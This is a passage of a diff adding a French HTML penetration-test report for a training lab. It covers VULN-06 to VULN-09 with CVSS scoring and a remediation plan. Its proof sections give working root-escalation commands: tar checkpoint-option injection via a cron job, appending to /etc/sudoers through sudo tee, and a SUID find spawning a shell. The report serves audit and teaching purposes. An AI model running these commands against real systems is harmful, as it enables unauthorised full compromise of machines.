+
+Étape 2 — Préparer le payload SUID
+echo 'cp /bin/bash /tmp/rootbash &amp;&amp; chmod u+s /tmp/rootbash' &gt; shell.sh
+chmod +x shell.sh
+
+Étape 3 — Créer les fausses options GNU tar
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+
+Étape 4 — Attendre et contrôler l’exécution du cron
+ls -l --full-time /home-john-backup.tgz
+ls -l /tmp/rootbash
+# Résultat attendu : -rwsr-xr-x root root /tmp/rootbash
+
+Étape 5 — Obtenir et vérifier le shell Root
+/tmp/rootbash -p
+whoami
+id
+# Résultat : root, avec un UID effectif égal à 0</pre>
+
+      <h3>Impact</h3>
+      <p>Exécution de commandes arbitraires par la tâche cron et élévation complète des privilèges depuis John jusqu’à Root, avec accès à l’ensemble des fichiers et secrets du système.</p>
+
+      <h3>Recommandations</h3>
+      <ul><li>Ne pas utiliser de caractères génériques dans une tâche cron privilégiée.</li><li>Insérer -- avant la liste des fichiers : tar -zcf archive.tar -- *.</li><li>Référencer explicitement les fichiers à sauvegarder.</li><li>Exécuter la sauvegarde avec un compte dédié disposant du minimum de privilèges.</li></ul>
+
+      <div class="cvss-block">
+        <div class="cvss-heading">
+          <div>
+            <span>ÉVALUATION DU RISQUE</span>
+            <h3>CVSS v2 — score de base</h3>
+          </div>
+          <div class="score risk-high">
+            <strong>9</strong>
+            <small>Élevé</small>
+          </div>
+        </div>
+        <p class="vector"><strong>Vecteur :</strong> <code>AV:N/AC:L/Au:S/C:C/I:C/A:C</code></p>
+        <p class="rationale">Dans le contexte du TP, l’accès est traité comme réseau. Un compte John est requis, puis l’exploitation mène à une compromission complète de Root.</p>
+        <div class="matrix-layout">
+          <div>
+    <table class="risk-matrix">
+      <caption>Matrice Impact × Exploitabilité</caption>
+      <thead>
+        <tr><th>Impact ↑</th><th>0</th><th>2</th><th>4</th><th>6</th><th>8</th><th>10</th></tr>
+      </thead>
+      <tbody><tr><th>10</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"><span class="matrix-point">9</span></td><td class="matrix-high"></td></tr><tr><th>8</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>6</th><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>4</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td></tr><tr><th>2</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr><tr><th>0</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr></tbody>
+      <tfoot><tr><th></th><th colspan="6">Exploitabilité →</th></tr></tfoot>
+    </table></div>
+          <div>
+    <table class="metrics-table">
+      <thead><tr><th>Code</th><th>Métrique</th><th>Valeur</th><th>Coefficient</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>AV</strong></td>
+          <td>Vecteur d’accès</td>
+          <td>Réseau</td>
+          <td>1</td>
+        </tr>
+        <tr>
+          <td><strong>AC</strong></td>
+          <td>Complexité d’accès</td>
+          <td>Faible</td>
+          <td>0,71</td>
+        </tr>
+        <tr>
+          <td><strong>Au</strong></td>
+          <td>Authentification</td>
+          <td>Unique</td>
+          <td>0,56</td>
+        </tr>
+        <tr>
+          <td><strong>C</strong></td>
+          <td>Confidentialité</td>
+          <td>Complet</td>
+          <td>0,66</td>
+        </tr>
+        <tr>
+          <td><strong>I</strong></td>
+          <td>Intégrité</td>
+          <td>Complet</td>
+          <td>0,66</td>
+        </tr>
+        <tr>
+          <td><strong>A</strong></td>
+          <td>Disponibilité</td>
+          <td>Complet</td>
+          <td>0,66</td>
+        </tr></tbody>
+    </table></div>
+        </div>
+        
+    <div class="calculation">
+      <p><strong>Impact</strong><br>
+      <code>10,41 × [1 − (1−0,66) × (1−0,66) × (1−0,66)]</code>
+      <span>= 10</span></p>
+      <p><strong>Exploitabilité</strong><br>
+      <code>20 × 1 × 0,71 × 0,56</code>
+      <span>= 8</span></p>
+      <p><strong>Score de base</strong><br>
+      <code>[(0,6 × 10) + (0,4 × 8) − 1,5] × 1,176</code>
+      <span>= 9 / 10</span></p>
+    </div>
+      </div>
+    </section>
+    <section id="vuln-07" class="vulnerability page-break">
+      <div class="section-tag">FICHE 07 · VULN 07</div>
+      <h2>VULN 07 — Mauvaise configuration sudo</h2>
+      <table class="identity-table">
+        <tr>
+          <th>Criticité audit</th><td>Critique</td>
+          <th>Statut</th><td>Confirmée</td>
+        </tr>
+        <tr>
+          <th>Chemin du schéma</th><td>User A / Alice → User R / Root</td>
+          <th>Service</th><td>sudo · tee</td>
+        </tr>
+        <tr>
+          <th>Prérequis</th><td>Compte Alice obtenu via VULN-03</td>
+          <th>Compte obtenu</th><td>Root</td>
+        </tr>
+      </table>
+      
+
+      <h3>Description technique</h3>
+      <p>Le compte Alice possède une règle sudo lui permettant d’exécuter tee sans mot de passe. Cette commande autorise l’écriture dans des fichiers système sensibles et permet d’obtenir les privilèges Root.</p>
+
+      <h3>Preuve d’exploitation</h3>
+      <pre>Étape 1 — Découverte (depuis le shell Alice)
+sudo -l
+# → (ALL : ALL) NOPASSWD: /usr/bin/tee -a *
+
+Étape 2 — Exploitation
+echo &quot;alice ALL=(ALL) NOPASSWD: ALL&quot; | sudo /usr/bin/tee -a /etc/sudoers
+
+Étape 3 — Devenir Root
+sudo su
+
+Résultat
+root@bf818c9b1d85:~# id
+uid=0(root) gid=0(root) groups=0(root)</pre>
+
+      <h3>Impact</h3>
+      <p>Modification arbitraire de fichiers système et élévation complète des privilèges vers Root.</p>
+
+      <h3>Recommandations</h3>
+      <ul><li>Supprimer la règle sudo associée à tee.</li><li>Limiter strictement les commandes autorisées.</li><li>Appliquer le principe du moindre privilège.</li></ul>
+
+      <div class="cvss-block">
+        <div class="cvss-heading">
+          <div>
+            <span>ÉVALUATION DU RISQUE</span>
+            <h3>CVSS v2 — score de base</h3>
+          </div>
+          <div class="score risk-high">
+            <strong>9</strong>
+            <small>Élevé</small>
+          </div>
+        </div>
+        <p class="vector"><strong>Vecteur :</strong> <code>AV:N/AC:L/Au:S/C:C/I:C/A:C</code></p>
+        <p class="rationale">Dans le contexte du TP, l’accès est traité comme réseau. Une session Alice est requise, puis la règle sudo permet une compromission complète.</p>
+        <div class="matrix-layout">
+          <div>
+    <table class="risk-matrix">
+      <caption>Matrice Impact × Exploitabilité</caption>
+      <thead>
+        <tr><th>Impact ↑</th><th>0</th><th>2</th><th>4</th><th>6</th><th>8</th><th>10</th></tr>
+      </thead>
+      <tbody><tr><th>10</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"><span class="matrix-point">9</span></td><td class="matrix-high"></td></tr><tr><th>8</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>6</th><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>4</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td></tr><tr><th>2</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr><tr><th>0</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr></tbody>
+      <tfoot><tr><th></th><th colspan="6">Exploitabilité →</th></tr></tfoot>
+    </table></div>
+          <div>
+    <table class="metrics-table">
+      <thead><tr><th>Code</th><th>Métrique</th><th>Valeur</th><th>Coefficient</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>AV</strong></td>
+          <td>Vecteur d’accès</td>
+          <td>Réseau</td>
+          <td>1</td>
+        </tr>
+        <tr>
+          <td><strong>AC</strong></td>
+          <td>Complexité d’accès</td>
+          <td>Faible</td>
+          <td>0,71</td>
+        </tr>
+        <tr>
+          <td><strong>Au</strong></td>
+          <td>Authentification</td>
+          <td>Unique</td>
+          <td>0,56</td>
+        </tr>
+        <tr>
+          <td><strong>C</strong></td>
+          <td>Confidentialité</td>
+          <td>Complet</td>
+          <td>0,66</td>
+        </tr>
+        <tr>
+          <td><strong>I</strong></td>
+          <td>Intégrité</td>
+          <td>Complet</td>
+          <td>0,66</td>
+        </tr>
+        <tr>
+          <td><strong>A</strong></td>
+          <td>Disponibilité</td>
+          <td>Complet</td>
+          <td>0,66</td>
+        </tr></tbody>
+    </table></div>
+        </div>
+        
+    <div class="calculation">
+      <p><strong>Impact</strong><br>
+      <code>10,41 × [1 − (1−0,66) × (1−0,66) × (1−0,66)]</code>
+      <span>= 10</span></p>
+      <p><strong>Exploitabilité</strong><br>
+      <code>20 × 1 × 0,71 × 0,56</code>
+      <span>= 8</span></p>
+      <p><strong>Score de base</strong><br>
+      <code>[(0,6 × 10) + (0,4 × 8) − 1,5] × 1,176</code>
+      <span>= 9 / 10</span></p>
+    </div>
+      </div>
+    </section>
+    <section id="vuln-08" class="vulnerability page-break">
+      <div class="section-tag">FICHE 08 · VULN 08</div>
+      <h2>VULN 08 — Binaire SUID dangereux</h2>
+      <table class="identity-table">
+        <tr>
+          <th>Criticité audit</th><td>Critique</td>
+          <th>Statut</th><td>Confirmée</td>
+        </tr>
+        <tr>
+          <th>Chemin du schéma</th><td>User B / Bob → User R / Root</td>
+          <th>Service</th><td>Binaire SUID · find</td>
+        </tr>
+        <tr>
+          <th>Prérequis</th><td>Compte Bob obtenu via VULN-04</td>
+          <th>Compte obtenu</th><td>Root</td>
+        </tr>
+      </table>
+      
+
+      <h3>Description technique</h3>
+      <p>Après l’obtention d’un shell SSH sous l’identité de Bob via VULN-04, une énumération locale des fichiers SUID révèle une copie anormale du binaire find dans /home/bob/find. Ce fichier appartient à Root et possède le bit SUID : lorsqu’il est exécuté par Bob, il conserve donc l’identité effective de son propriétaire. La fonctionnalité légitime -exec de find permet de lancer une commande externe ; elle est détournée pour exécuter /bin/sh, tandis que l’option -p empêche le shell d’abandonner les privilèges hérités. L’attaquant obtient ainsi immédiatement un shell dont l’identité effective est Root, sans mot de passe ni exploitation supplémentaire.</p>
+
+      <h3>Preuve d’exploitation</h3>
+      <pre>Étape 1 — Confirmer le compte compromis
+whoami
+id
+# Utilisateur courant : Bob
+
+Étape 2 — Rechercher les fichiers possédant le bit SUID
+find / -perm -4000 -type f 2&gt;/dev/null
+# Résultat notable : /home/bob/find
+
+Étape 3 — Vérifier le propriétaire et les permissions
+ls -l /home/bob/find
+file /home/bob/find
+# Le propriétaire est Root et le mode inclut le bit SUID (s)
+
+Étape 4 — Exploiter la fonctionnalité -exec de find
+/home/bob/find . -exec /bin/sh -p \; -quit
+# -exec lance un shell
+# -p conserve les privilèges effectifs hérités du binaire SUID
+
+Étape 5 — Vérifier l’élévation de privilèges
+whoami
+id
+# Résultat : identité effective Root, euid=0(root)
+
+Résultat final
+Un shell Root interactif est obtenu depuis le compte Bob.</pre>
+
+      <h3>Impact</h3>
+      <p>Élévation locale immédiate et complète depuis Bob vers Root. L’attaquant peut lire ou modifier tous les fichiers, récupérer les secrets du système, altérer sa configuration, créer des comptes privilégiés, installer une persistance et compromettre intégralement la machine.</p>
+
+      <h3>Recommandations</h3>
+      <ul><li>Supprimer immédiatement le bit SUID avec chmod u-s /home/bob/find.</li><li>Supprimer cette copie locale et utiliser uniquement le binaire système officiel.</li><li>Rechercher et auditer régulièrement tous les fichiers SUID avec find / -perm -4000 -type f.</li><li>Contrôler les propriétaires, permissions et empreintes des binaires privilégiés.</li><li>Appliquer le principe du moindre privilège et surveiller la création de nouveaux fichiers SUID.</li></ul>
+
+      <div class="cvss-block">
+        <div class="cvss-heading">
+          <div>
+            <span>ÉVALUATION DU RISQUE</span>
+            <h3>CVSS v2 — score de base</h3>
+          </div>
+          <div class="score risk-high">
+            <strong>9</strong>
+            <small>Élevé</small>
+          </div>
+        </div>
+        <p class="vector"><strong>Vecteur :</strong> <code>AV:N/AC:L/Au:S/C:C/I:C/A:C</code></p>
+        <p class="rationale">Dans le contexte du TP, l’accès est traité comme réseau. Une session Bob est requise, puis le binaire SUID permet une compromission complète.</p>
+        <div class="matrix-layout">
+          <div>
+    <table class="risk-matrix">
+      <caption>Matrice Impact × Exploitabilité</caption>
+      <thead>
+        <tr><th>Impact ↑</th><th>0</th><th>2</th><th>4</th><th>6</th><th>8</th><th>10</th></tr>
+      </thead>
+      <tbody><tr><th>10</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"><span class="matrix-point">9</span></td><td class="matrix-high"></td></tr><tr><th>8</th><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>6</th><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td><td class="matrix-high"></td></tr><tr><th>4</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-high"></td></tr><tr><th>2</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr><tr><th>0</th><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-low"></td><td class="matrix-medium"></td><td class="matrix-medium"></td></tr></tbody>
+      <tfoot><tr><th></th><th colspan="6">Exploitabilité →</th></tr></tfoot>
+    </table></div>
+          <div>
+    <table class="metrics-table">
+      <thead><tr><th>Code</th><th>Métrique</th><th>Valeur</th><th>Coefficient</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>AV</strong></td>
+          <td>Vecteur d’accès</td>
+          <td>Réseau</td>
+          <td>1</td>
+        </tr>
+        <tr>
+          <td><strong>AC</strong></td>
+          <td>Complexité d’accès</td>
+          <td>Faible</td>
+          <td>0,71</td>
+        </tr>
+        <tr>
+          <td><strong>Au</strong></td>
+          <td>Authentification</td>
+          <td>Unique</td>
+          <td>0,56</td>
+        </tr>
+        <tr>
+          <td><strong>C</strong></td>
+          <td>Confidentialité</td>
+          <td>Complet</td>
+          <td>0,66</td>
+        </tr>
+        <tr>
+          <td><strong>I</strong></td>
+          <td>Intégrité</td>
+          <td>Complet</td>
+          <td>0,66</td>
+        </tr>
+        <tr>
+          <td><strong>A</strong></td>
+          <td>Disponibilité</td>
+          <td>Complet</td>
+          <td>0,66</td>
+        </tr></tbody>
+    </table></div>
+        </div>
+        
+    <div class="calculation">
+      <p><strong>Impact</strong><br>
+      <code>10,41 × [1 − (1−0,66) × (1−0,66) × (1−0,66)]</code>
+      <span>= 10</span></p>
+      <p><strong>Exploitabilité</strong><br>
+      <code>20 × 1 × 0,71 × 0,56</code>
+      <span>= 8</span></p>
+      <p><strong>Score de base</strong><br>
+      <code>[(0,6 × 10) + (0,4 × 8) − 1,5] × 1,176</code>
+      <span>= 9 / 10</span></p>
+    </div>
+      </div>
+    </section>
+    <section id="vuln-09" class="vulnerability page-break">
+      <div class="section-tag">FICHE 09 · VULN 09</div>
+      <h2>VULN 09 — Accès Root alternatif</h2>
+      <table class="identity-table">
+        <tr>
+          <th>Criticité audit</th><td>À confirmer</td>
+          <th>Statut</th><td>Non confirmée</td>
+        </tr>
+        <tr>
+          <th>Chemin du schéma</th><td>Kali → User R / Root</td>
+          <th>Service</th><td>Non déterminé</td>
+        </tr>
+        <tr>
+          <th>Prérequis</th><td>Non déterminé</td>
+          <th>Compte obtenu</th><td>Root · hypothèse du schéma</td>
+        </tr>
+      </table>
+      <div class="notice muted"><strong>Vulnérabilité non trouvée.</strong> Aucun mécanisme ni score CVSS ne doit être inventé.</div>
+
+      <h3>Description technique</h3>
+      <p>Le schéma présente une voie supplémentaire permettant un accès direct au compte Root depuis la machine de l’attaquant. Aucun mécanisme d’exploitation n’a été confirmé durant l’audit.</p>
+
+      <h3>Preuve d’exploitation</h3>
+      <pre>Aucune preuve technique disponible.</pre>
+
+      <h3>Impact</h3>
+      <p>Non évalué en l’absence de validation technique.</p>
+
+      <h3>Recommandations</h3>
+      <ul><li>Conserver ce chemin comme hypothèse tant qu’il n’est pas reproduit.</li><li>Documenter une preuve reproductible avant de le déclarer exploitable.</li></ul>
+
+      <div class="cvss-block">
+        <div class="cvss-heading">
+          <div>
+            <span>ÉVALUATION DU RISQUE</span>
+            <h3>CVSS v2 — score de base</h3>
+          </div>
+          <div class="score risk-na">
+            <strong>N/A</strong>
+            <small>Non calculable</small>
+          </div>
+        </div>
+        <p class="vector"><strong>Vecteur :</strong> <code>Non disponible</code></p>
+        <p class="rationale">Aucun vecteur ne peut être attribué avant l’identification du mécanisme d’exploitation.</p>
+        <div class="matrix-layout">
+          <div>
+      <div class="matrix-unavailable">
+        <strong>Matrice non calculable</strong>
+        <p>Le mécanisme de VULN-09 n’est pas identifié. Positionner cette vulnérabilité dans la matrice créerait un résultat spéculatif.</p>
+      </div></div>
+          <div></div>
+        </div>
+        
+      </div>
+    </section>
+
+  <section class="page-break">
+    <div class="section-tag">05 · PLAN DE REMÉDIATION</div>
+    <h2>Plan de remédiation priorisé</h2>
+    <table>
+      <thead><tr><th>Priorité</th><th>Actions</th><th>Vulnérabilités concernées</th></tr></thead>
+      <tbody>
+        <tr><td><strong>P1 — Immédiate</strong></td><td>Supprimer les chemins d’élévation Root : corriger le cron tar, retirer la règle sudo tee et supprimer le bit SUID de find.</td><td>VULN-06, VULN-07, VULN-08</td></tr>
+        <tr><td><strong>P1 — Immédiate</strong></td><td>Corriger les injections de commandes et SQL avec des API sûres et des requêtes préparées.</td><td>VULN-01, VULN-04</td></tr>
+        <tr><td><strong>P1 — Immédiate</strong></td><td>Révoquer les secrets exposés, renouveler les clés et mots de passe, supprimer les données sensibles des scripts et interfaces.</td><td>VULN-03, VULN-04, VULN-05</td></tr>
+        <tr><td><strong>P2 — Rapide</strong></td><td>Désactiver FTP anonyme et l’authentification SSH par mot de passe lorsque possible ; déployer une limitation des tentatives.</td><td>VULN-02, VULN-03</td></tr>
+        <tr><td><strong>P3 — Investigation</strong></td><td>Reproduire l’attaque Hydra de VULN-02 et poursuivre l’identification de VULN-09 sans leur attribuer de conclusion prématurée.</td><td>VULN-02, VULN-09</td></tr>
+      </tbody>
+    </table>
+    <h3>Conclusion</h3>
+    <p>La compromission complète du laboratoire repose sur l’enchaînement de faiblesses applicatives, de secrets exposés et de configurations privilégiées dangereuses. La correction d’une seule étape réduit le risque, mais la remédiation doit viser l’ensemble des maillons afin d’empêcher les chemins alternatifs.</p>
+    <div class="footer-note">Fin du rapport — EvilCorp · 3 juillet 2026</div>
+  </section>
+</body>
+</html>
